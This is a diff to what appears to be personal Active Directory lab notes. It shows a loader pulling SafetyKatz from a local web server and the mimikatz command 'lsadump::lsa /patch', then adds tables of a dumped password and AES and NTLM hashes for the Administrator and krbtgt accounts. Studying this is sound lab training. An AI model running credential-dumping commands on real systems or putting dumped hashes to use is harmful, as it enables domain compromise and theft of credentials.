@@ -347,3 +347,19 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 lsadump::lsa /patch
 ```
 ![[Pasted image 20231023111808.png]]
+`Administrator- DCORP-DC`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| Password    | AServicewhichIsNotM3@nttoBe                                      |
+| aes256_hmac | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
+| rc4_hmac_nt | cc098f204c5887eaa8253e7c2749156f                                 |
+
+kr- DCORP-DC`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| Password    | AServicewhichIsNotM3@nttoBe                                      |
+| aes256_hmac | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
+| rc4_hmac_nt | cc098f204c5887eaa8253e7c2749156f                                 |
+
